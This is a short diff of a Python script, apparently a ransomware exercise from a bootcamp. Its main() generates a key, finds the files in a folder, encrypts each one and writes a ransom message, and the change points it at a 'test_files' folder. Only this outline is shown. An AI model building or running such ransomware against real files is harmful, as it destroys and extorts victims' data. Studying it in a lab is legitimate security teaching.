@@ -42,7 +42,7 @@ def criar_mensagem_resgate():
 def main():
     gerar_chave()
     chave = carregar_chave()
-    arquivos = encontrar_arquivos("BootCampSantander2025")
+    arquivos = encontrar_arquivos("test_files")
     for arquivo in arquivos:
         criptografar_arquivo(arquivo, chave)
     criar_mensagem_resgate()
